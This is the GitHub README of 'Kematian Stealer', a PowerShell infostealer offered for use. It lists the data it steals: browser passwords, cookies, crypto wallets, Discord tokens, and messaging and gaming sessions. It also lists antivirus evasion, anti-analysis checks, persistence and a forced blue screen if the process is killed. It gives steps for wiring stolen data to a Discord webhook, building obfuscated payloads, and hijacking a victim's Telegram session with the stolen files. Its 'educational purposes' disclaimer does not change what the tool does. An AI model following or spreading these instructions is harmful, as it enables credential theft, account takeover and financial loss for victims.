<p align="center">
<img src="https://github.com/Chainski/Kematian-Stealer/assets/96607632/b122c6d8-713c-4ccb-9567-d24d6c0672b5", width="400", height="400">
</p>

<h1 align="center">
</h1>
<p align= "center">
  <img src="https://img.shields.io/github/languages/top/ChildrenOfYahweh/Kematian-Stealer?color=fca107">
   <img src="https://img.shields.io/github/stars/ChildrenOfYahweh/Kematian-Stealer?style=flat&color=fca107">
   <img src="https://img.shields.io/github/forks/ChildrenOfYahweh/Kematian-Stealer?style=flat&color=fca107">
   <img src="https://img.shields.io/github/issues/ChildrenOfYahweh/Kematian-Stealer?style=flat&color=fca107">
  <img src="https://img.shields.io/github/commit-activity/m/ChildrenOfYahweh/Kematian-Stealer?color=fca107">
  <img src="https://img.shields.io/badge/Powershell-v3.0-fca107">
  <br>
   <img src="https://img.shields.io/github/last-commit/ChildrenOfYahweh/Kematian-Stealer?color=fca107">
   <img src="https://img.shields.io/github/license/ChildrenOfYahweh/Kematian-Stealer?color=fca107">
   <img src="https://img.shields.io/github/contributors/ChildrenOfYahweh/Kematian-Stealer?color=fca107">
    <img src="https://hits.sh/github.com/ChildrenOfYahweh/Kematian-Stealer.svg?label=views&color=fca107">
    <img src="https://img.shields.io/github/repo-size/ChildrenOfYahweh/Kematian-Stealer?color=fca107"
    <img src="https://img.shields.io/github/downloads/ChildrenOfYahweh/Kematian-Stealer/total?color=fca107">
   <br>
</p>

<h1 align="center">Kematian Stealer</h1>

# About The Project
Kematian Stealer is a [PowerShell-based](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) tool designed to effortlessly infiltrate and exfiltrate data from Windows systems. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks). It functions seamlessly across any `x64bit` system, from `Windows 8 x64 to Windows 11 x64`, ensuring compatibility with the latest updates. With Kematian Stealer, you can retrieve `seed phrases, session files, passwords, application data, Discord information` and more.

This tool is particularly advantageous for accessing application and file data without restrictions, while evading conventional security measures such as `firewalls` and `antivirus` software, thanks to its `fileless capabilities`, which set it apart from other stealers. Upon execution, Kematian Stealer creates a `mutex` on the system and designates the process as `critical` before initiating data exfiltration, ensuring smooth and uninterrupted transmission of data.

Moreover, the tool has robust `persistence mechanisms` to remain active on the machine after reboot. Additionally, its user-friendly `GUI builder` simplifies the process of creating payloads, enhancing its accessibility and usability.
<br>

# Usage
- Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
- After creating a server go to `Edit channel` > `Integrations` > `Webhooks` > `Create Webhook`
- Copy the `Webhook URL`
- Download [main.ps1](https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/main.ps1) 
- Open `main.ps1` and replace `YOUR_WEBHOOK_HERE` in line `30` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).

# Requirements
- To build Kematian, you need:
- Windows 8 or higher `x64`.
- Powershell `v3.0` or higher.
- An active internet connection.

# Obfuscation 
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) for `.ps1` files
- [Somalifuscator](https://github.com/kdot227/somalifuscator) for `.bat` files 

# Screenshots
  ## 🔨 Builder
> ![builder](https://github.com/Chainski/Kematian-Stealer/assets/96607632/00bd1db9-1186-408a-a399-c5911bcd447f)

   ### Builder Features
 - [x] 🔸 Obfuscation of `BAT` and `PS1` files
 - [x] 🔩 Compilation of Exe Files 
 - [x] 💉 Pump/Inject the output exe file with zero-filled bytes 

 ## 🔷 Webhook Data
> ![screenshot](https://github.com/Chainski/Kematian-Stealer/assets/96607632/a241421a-eeb1-4bc7-aa75-0595745f6ffd)


> ![webhook](https://github.com/Chainski/Kematian-Stealer/assets/96607632/12b32ee5-330d-46f4-9b92-59c048c0fa90)

#  Features
- [x] GUI Builder
- [x] Anti-Kill (Terminating Kematian will result in a system crash, indicated by a `BSoD` [blue screen of death](https://support.microsoft.com/en-us/windows/resolving-blue-screen-errors-in-windows-60b01860-58f2-be66-7516-5c45a66ae3c6)).
- [x] [Mutex](https://learn.microsoft.com/en-us/dotnet/api/system.threading.mutex?view=net-7.0) (single instance)
- [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [x] Antivirus Evasion: Disables [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) , excluded from `Windows Defender` and blocks access to antivirus websites in [hosts file](https://support.microsoft.com/en-us/topic/how-to-reset-the-hosts-file-back-to-the-default-c2a43f9d-e176-c6f3-e4ef-3500277a6dae). 
- [x] Anti-Analysis `VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run`
- [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
- [x] Extracts WiFi Passwords
- [x] Files Stealer `2fa, backupcodes, seedphrases, passwords, privatekeys, etc.` 
- [x] 📷 Webcam & Desktop Screenshots
- [x] Session Stealers 
  > ### Messaging
    - [Element](https://element.io) 
    - [ICQ](https://icq.com)
    - [Signal](https://signal.org) 
    - [Telegram](https://telegram.org) 
    - [Viber](https://viber.com) 
    - [WhatsApp](https://whatsapp.com)
    - [Skype](https://skype.com/en/get-skype/)
  > ### Gaming 
    - [Electronic Arts](https://ea.com)
    - [Epicgames](https://store.epicgames.com)
    - [Growtopia](https://growtopiagame.com)
    - [Minecraft](https://minecraft.net)
    - [Ubisoft](https://ubisoftconnect.com)
    - [Steam](https://store.steampowered.com)
    - [Battle.net](https://battle.net)
- [x] VPN Clients
    - [Nord](https://nordvpn.com) 
    - [Proton](https://protonvpn.com)
    - [Surfshark](https://surfshark.com)
- [x] [Filezilla Hosts]
- [x] Crypto Wallets 
   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
- [x] Browsers (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
  - 🔑 Passwords
  - 🍪 Cookies
  - 📜 History
- [x] Extracts [Discord](https://discord.com) Token
- [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
- [x] List of Installed Applications
- [x] List of Installed Antiviruses
- [x] List of all Network Adapters
- [x] List of Apps that Run On Startup
- [x] List of Running Services & Applications
- [x] Extracts Product Key
- [x] Self-Destructs After Execution (optional)

### Telegram Session Stealer Usage :
After the exfiltrated data is uploaded to your discord webhook, download the compressed file `Kematian.zip`, extract it on your PC, inside that folder there will also be another subfolder `Messaging Sessions` , inside this subfolder you will find the `Telegram` folder.
Now, copy the `tdata` folder from `Telegram` folder and paste it in the directory below:

`
%userprofile%\AppData\Roaming\Telegram Desktop
`
Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
# ![telegram](https://github.com/Chainski/Kematian-Stealer/assets/96607632/e5274437-db64-4123-af6c-c2617a67a12f)



 > [!NOTE]   
 > ***The other session stealers can be utilized by applying the technique above***
 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder, ExclusionPaths and Resets Hosts File)
- Open a new Elevated Powershell Console then copy & paste the contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "Kematian" -Confirm:$False
  Remove-Item -Path "$env:appdata\Kematian" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
$resethostsfile = @'
# Copyright (c) 1993-2006 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handle within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
'@
  [IO.File]::WriteAllText("$env:windir\System32\Drivers\etc\hosts", $resethostsfile)
  Write-Host "[~] Successfully Uninstalled Kematian !" -ForegroundColor Green
}
Cleanup
```

# Need Help?
- [Join our discord server](https://discord.com/invite/WJCNUpxnrE)

# Bug Reports and Suggestions
Found a bug? Have an idea? Let me know [here](https://github.com/KDot227/Kematian-Stealer/issues), Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Kematian-Stealer/blob/main/LICENSE) file for details

# Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this tool was created for educational purposes only.
This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

# Credits
- https://github.com/KDot227
- https://github.com/Chainski
- https://github.com/EvilBytecode

<p align="center"><a href=#top>Back to Top</a></p>
